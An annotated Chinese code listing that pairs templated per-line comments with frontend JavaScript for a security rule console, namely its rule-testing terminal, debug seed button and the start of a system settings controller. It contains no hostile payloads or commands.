| 600 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.btnSave.addEventListener("click", saveRule);` |
| 601 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnDelete.addEventListener("click", () => {` |
| 602 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (state.editingId) {` |
| 603 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        deleteRule(state.editingId);` |
| 604 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        closeDrawer();` |
| 605 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 606 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 607 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 608 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 609 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 610 | 注释：说明前端逻辑或交互意图。 | `   * 内嵌测试终端` |
| 611 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 612 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function resetTerminal() {` |
| 613 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.tTerminal.querySelectorAll(".terminal__line").forEach((n) => n.remove());` |
| 614 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    addTerminalLine("终端就绪：输入样本后运行测试。", "dim");` |
| 615 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.tInput.value = "";` |
| 616 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.tPayload.value = "";` |
| 617 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.tSrcIp.value = "";` |
| 618 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.tFeatures.value = "";` |
| 619 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 620 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 621 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function addTerminalLine(text, kind = "") {` |
| 622 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const line = document.createElement("div");` |
| 623 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    line.className = "terminal__line";` |
| 624 | 页面更新：修改元素内容、样式或状态。 | `    if (kind === "cmd") line.classList.add("terminal__line--cmd");` |
| 625 | 页面更新：修改元素内容、样式或状态。 | `    if (kind === "ok") line.classList.add("terminal__line--ok");` |
| 626 | 页面更新：修改元素内容、样式或状态。 | `    if (kind === "err") line.classList.add("terminal__line--err");` |
| 627 | 页面更新：修改元素内容、样式或状态。 | `    if (kind === "dim") line.classList.add("text-tertiary");` |
| 628 | 页面更新：修改元素内容、样式或状态。 | `    line.textContent = text;` |
| 629 | 注释：说明前端逻辑或交互意图。 | `    // 插到 prompt 之前` |
| 630 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const prompt = el.tTerminal.querySelector(".terminal__prompt");` |
| 631 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.tTerminal.insertBefore(line, prompt);` |
| 632 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.tTerminal.scrollTop = el.tTerminal.scrollHeight;` |
| 633 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 634 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 635 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function buildSample() {` |
| 636 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const featuresRaw = el.tFeatures.value.trim();` |
| 637 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let features = undefined;` |
| 638 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (featuresRaw) {` |
| 639 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      try {` |
| 640 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        features = JSON.parse(featuresRaw);` |
| 641 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (typeof features !== "object" \|\| Array.isArray(features)) {` |
| 642 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          throw new Error("features 必须是 JSON 对象");` |
| 643 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 644 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } catch (err) {` |
| 645 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        throw new Error("features 不是合法 JSON：" + err.message);` |
| 646 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 647 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 648 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const sample = {};` |
| 649 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const payload = el.tPayload.value \|\| el.tInput.value;` |
| 650 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (payload) sample.payload = payload;` |
| 651 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (el.tSrcIp.value.trim()) sample.src_ip = el.tSrcIp.value.trim();` |
| 652 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (features !== undefined) sample.features = features;` |
| 653 | 返回结果：把计算值交给调用方。 | `    return sample;` |
| 654 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 655 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 656 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function runTest() {` |
| 657 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let sample;` |
| 658 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 659 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      sample = buildSample();` |
| 660 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 661 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      addTerminalLine(err.message, "err");` |
| 662 | 返回结果：把计算值交给调用方。 | `      return;` |
| 663 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 664 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    addTerminalLine(` |
| 665 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "$ test " +` |
| 666 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        (state.editingId ? "rule_id=" + state.editingId : "<草稿规则>") +` |
| 667 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        " sample=" +` |
| 668 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        JSON.stringify(sample),` |
| 669 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "cmd"` |
| 670 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 671 | 注释：说明前端逻辑或交互意图。 | `    // 若抽屉里是已保存规则且没有改动，直接用 rule_id；否则发草稿` |
| 672 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const payload = {` |
| 673 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      sample,` |
| 674 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 675 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.editingId) {` |
| 676 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      payload.rule_id = state.editingId;` |
| 677 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else {` |
| 678 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const draft = collectForm();` |
| 679 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!validateFormClientSide(draft)) {` |
| 680 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        addTerminalLine("前端校验未通过，请先补全规则字段", "err");` |
| 681 | 返回结果：把计算值交给调用方。 | `        return;` |
| 682 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 683 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      payload.rule = draft;` |
| 684 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 685 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 686 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const result = await fetchApi("/api/rules/test", {` |
| 687 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "POST",` |
| 688 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: payload,` |
| 689 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 690 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const kind = result.matched ? "ok" : "dim";` |
| 691 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      addTerminalLine(` |
| 692 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        (result.matched ? "✓ 命中" : "· 未命中") +` |
| 693 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "  [" +` |
| 694 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          (result.rule_type \|\| "") +` |
| 695 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "]  " +` |
| 696 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          (result.reason \|\| ""),` |
| 697 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        kind` |
| 698 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 699 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 700 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      addTerminalLine("× 测试失败：" + (err.message \|\| ""), "err");` |
| 701 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 702 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 703 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 704 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindTerminalHandlers() {` |
| 705 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.tRun.addEventListener("click", runTest);` |
| 706 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.tInput.addEventListener("keydown", (e) => {` |
| 707 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (e.key === "Enter") {` |
| 708 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        e.preventDefault();` |
| 709 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        runTest();` |
| 710 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 711 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 712 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 713 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 714 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 715 | 注释：说明前端逻辑或交互意图。 | `   * DEBUG seed` |
| 716 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 717 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function maybeEnableSeedButton() {` |
| 718 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!el.btnSeed) return;` |
| 719 | 注释：说明前端逻辑或交互意图。 | `    // 用已认证的 OPTIONS 探针最简单，但后端未暴露 OPTIONS 逻辑细分；` |
| 720 | 注释：说明前端逻辑或交互意图。 | `    // 改为一次受鉴权的 GET /api/alerts/_seed 的兄弟 —— 这里直接用后端的` |
| 721 | 注释：说明前端逻辑或交互意图。 | `    // capabilities：只要 DEBUG，alerts 的 _seed 也开放；共享门控即可。` |
| 722 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 723 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const resp = await fetch("/api/alerts/_seed", {` |
| 724 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        method: "POST",` |
| 725 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        headers: {` |
| 726 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "Content-Type": "application/json",` |
| 727 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          Authorization: "Bearer " + window.AGApi.getToken(),` |
| 728 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        },` |
| 729 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        body: JSON.stringify({ count: 0 }),` |
| 730 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 731 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (resp.status === 201 \|\| resp.status === 400) {` |
| 732 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.btnSeed.hidden = false;` |
| 733 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 734 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (_) {` |
| 735 | 注释：说明前端逻辑或交互意图。 | `      // 网络异常则保持隐藏` |
| 736 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 737 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 738 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 739 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindSeedButton() {` |
| 740 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!el.btnSeed) return;` |
| 741 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnSeed.addEventListener("click", async () => {` |
| 742 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      try {` |
| 743 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const r = await fetchApi("/api/rules/_seed", { method: "POST" });` |
| 744 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast("已生成 " + (r.created \|\| 0) + " 条演示规则", "info");` |
| 745 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        applyFilters();` |
| 746 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        refreshGlobalCounts();` |
| 747 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } catch (err) {` |
| 748 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        toast("生成失败：" + (err.message \|\| ""), "error");` |
| 749 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 750 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 751 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 752 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 753 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 754 | 注释：说明前端逻辑或交互意图。 | `   * 启动` |
| 755 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 756 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function init() {` |
| 757 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindFilters();` |
| 758 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindTableHandlers();` |
| 759 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindDrawerHandlers();` |
| 760 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindTerminalHandlers();` |
| 761 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindSeedButton();` |
| 762 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 763 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    await loadList();` |
| 764 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    refreshGlobalCounts();` |
| 765 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    maybeEnableSeedButton();` |
| 766 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 767 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 768 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (document.readyState === "loading") {` |
| 769 | 事件绑定：监听用户操作并触发对应处理函数。 | `    document.addEventListener("DOMContentLoaded", init);` |
| 770 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  } else {` |
| 771 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    init();` |
| 772 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 773 | 前端语句：驱动页面交互、状态管理或数据展示。 | `})();` |

## `web/static/js/settings.js`

- 类型：前端静态资源
- 行数：385

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：说明前端逻辑或交互意图。 | `/*` |
| 2 | 注释：说明前端逻辑或交互意图。 | ` * settings.js — 系统设置控制器（Phase 7，Prompt §5）` |
| 3 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 4 | 注释：说明前端逻辑或交互意图。 | ` * 职责：` |
| 5 | 注释：说明前端逻辑或交互意图。 | ` *   1. 拉取 /api/settings → 把 editable 值灌入输入控件` |
| 6 | 注释：说明前端逻辑或交互意图。 | ` *   2. 绑定 change 事件 → 维护「已修改」脏位` |
| 7 | 注释：说明前端逻辑或交互意图。 | ` *   3. 保存：PUT /api/settings；400 时把 errors 挂到对应字段` |
| 8 | 注释：说明前端逻辑或交互意图。 | ` *   4. 通知测试：POST /api/settings/test_webhook\|test_email` |
| 9 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 10 | 注释：说明前端逻辑或交互意图。 | ` * schema 由后端下发（SETTINGS_SCHEMA），hint / min / max / step 都由它驱动。` |
| 11 | 注释：说明前端逻辑或交互意图。 | ` */` |
| 12 | 前端语句：驱动页面交互、状态管理或数据展示。 | `(function () {` |
| 13 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  "use strict";` |
| 14 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 15 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (!window.AGApi) return;` |
| 16 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { fetchApi } = window.AGApi;` |
| 17 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { escapeHtml, toast } = window.AGUI;` |
| 18 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 19 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const state = {` |
| 20 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    schema: {},` |
| 21 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    saved: {},   // 已保存（来自后端）` |
| 22 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    current: {}, // 表单当前值` |
| 23 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    dirty: false,` |
| 24 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 25 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 26 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 27 | 注释：说明前端逻辑或交互意图。 | `   * DOM 查询帮助` |
| 28 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 29 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function qBind(key) {` |
| 30 | DOM 查询：定位页面元素以便读取或更新。 | `    return document.querySelector(\`[data-bind="${key}"]\`);` |
| 31 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 32 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function qDisplay(key) {` |
| 33 | DOM 查询：定位页面元素以便读取或更新。 | `    return document.querySelector(\`[data-bind-display="${key}"]\`);` |
| 34 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 35 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function qHint(field) {` |
| 36 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const el = document.querySelector(` |
| 37 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      \`[data-field="${field}"] .settings-field__hint\`` |
| 38 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 39 | 返回结果：把计算值交给调用方。 | `    return el;` |
| 40 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 41 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function qLabel(field) {` |
| 42 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const el = document.querySelector(` |
| 43 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      \`[data-field="${field}"] .settings-field__label\`` |
| 44 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 45 | 返回结果：把计算值交给调用方。 | `    return el;` |
| 46 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 47 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function qError(field) {` |
| 48 | DOM 查询：定位页面元素以便读取或更新。 | `    return document.querySelector(\`[data-error="${field}"]\`);` |
| 49 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 50 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function qRuntime(key) {` |
| 51 | DOM 查询：定位页面元素以便读取或更新。 | `    return document.querySelector(\`[data-runtime="${key}"]\`);` |
| 52 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 53 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 54 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const statusText = document.getElementById("settings-status-text");` |
| 55 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const statusEl = document.getElementById("settings-status");` |
| 56 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const btnSave = document.getElementById("btn-save");` |
| 57 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const btnReset = document.getElementById("btn-reset");` |
| 58 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 59 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 60 | 注释：说明前端逻辑或交互意图。 | `   * 首次渲染` |
| 61 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 62 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function loadSnapshot() {` |
| 63 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setStatus("loading", "加载中…");` |
| 64 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 65 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const snap = await fetchApi("/api/settings");` |
| 66 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.schema = snap.schema \|\| {};` |
| 67 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.saved = Object.assign({}, snap.editable \|\| {});` |
| 68 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.current = Object.assign({}, state.saved);` |
| 69 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applySchema(state.schema);` |
| 70 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyEditableToForm(state.current);` |
| 71 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyRuntime(snap.runtime \|\| {});` |
| 72 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      setDirty(false);` |
| 73 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      setStatus("saved", "已从服务器加载最新配置");` |
| 74 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 75 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      setStatus("err", "加载失败：" + (err.message \|\| ""));` |
| 76 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 77 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 78 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 79 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function applySchema(schema) {` |
| 80 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    Object.entries(schema).forEach(([key, spec]) => {` |
| 81 | 注释：说明前端逻辑或交互意图。 | `      // 填 label / hint` |
| 82 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const labelNode = qLabel(key);` |
| 83 | 页面更新：修改元素内容、样式或状态。 | `      if (labelNode && spec.label) labelNode.textContent = spec.label;` |
| 84 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const hintNode = qHint(key);` |
| 85 | 页面更新：修改元素内容、样式或状态。 | `      if (hintNode && spec.hint) hintNode.textContent = spec.hint;` |
| 86 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 87 | 注释：说明前端逻辑或交互意图。 | `      // 根据 spec 设置输入控件属性` |
| 88 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const input = qBind(key);` |
| 89 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!input) return;` |
| 90 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (spec.type === "float") {` |
| 91 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.type = "range";` |
| 92 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.min = String(spec.min ?? 0);` |
| 93 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.max = String(spec.max ?? 1);` |
| 94 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.step = String(spec.step ?? 0.01);` |
| 95 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (spec.type === "bool") {` |
| 96 | 注释：说明前端逻辑或交互意图。 | `        // checkbox：无需额外属性` |
| 97 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (spec.type === "email") {` |
| 98 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.type = "email";` |
| 99 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.placeholder = spec.placeholder \|\| "";` |
| 100 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (spec.type === "url") {` |
| 101 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.type = "url";` |
| 102 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.placeholder = spec.placeholder \|\| "";` |
| 103 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (spec.type === "string") {` |
| 104 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.type = "text";` |
| 105 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (spec.pattern) input.pattern = spec.pattern;` |
| 106 | 条件判断：根据页面状态或数据决定执行路径。 | `        if (spec.placeholder) input.placeholder = spec.placeholder;` |
| 107 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 108 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 109 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 110 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 111 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function applyEditableToForm(values) {` |
| 112 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    Object.entries(state.schema).forEach(([key, spec]) => {` |
| 113 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const input = qBind(key);` |
| 114 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!input) return;` |
| 115 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const raw = values[key];` |
| 116 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (spec.type === "bool") {` |
| 117 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.checked = !!raw;` |
| 118 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (spec.type === "float") {` |
| 119 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const v =` |
| 120 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          typeof raw === "number"` |
| 121 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            ? raw` |
| 122 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            : parseFloat(raw) \|\| spec.min \|\| 0;` |
| 123 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.value = String(v);` |
| 124 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const d = qDisplay(key);` |
| 125 | 页面更新：修改元素内容、样式或状态。 | `        if (d) d.textContent = v.toFixed(2);` |
| 126 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else {` |
| 127 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        input.value = raw ?? "";` |
| 128 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 129 | 注释：说明前端逻辑或交互意图。 | `      // 清掉旧错误` |
| 130 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      clearError(key);` |
| 131 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 132 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 133 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 134 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function applyRuntime(runtime) {` |
| 135 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const set = (key, render) => {` |
| 136 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const el = qRuntime(key);` |
| 137 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!el) return;` |
| 138 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      render(el, runtime[key]);` |
| 139 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 140 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    set("jwt_access_expires_seconds", (el, v) => {` |
| 141 | 页面更新：修改元素内容、样式或状态。 | `      el.textContent = typeof v === "number" ? \`${v} 秒 · ≈ ${fmtDuration(v)}\` : "—";` |
| 142 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 143 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    set("jwt_refresh_expires_seconds", (el, v) => {` |
| 144 | 页面更新：修改元素内容、样式或状态。 | `      el.textContent = typeof v === "number" ? \`${v} 秒 · ≈ ${fmtDuration(v)}\` : "—";` |
| 145 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 146 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    set("api_rate_limit", (el, v) => {` |
| 147 | 页面更新：修改元素内容、样式或状态。 | `      el.textContent = v \|\| "—";` |
| 148 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 149 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    set("log_integrity_enabled", (el, v) => {` |
| 150 | 页面更新：修改元素内容、样式或状态。 | `      el.textContent = v ? "已启用 (SHA-256 链式校验)" : "未启用";` |
| 151 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
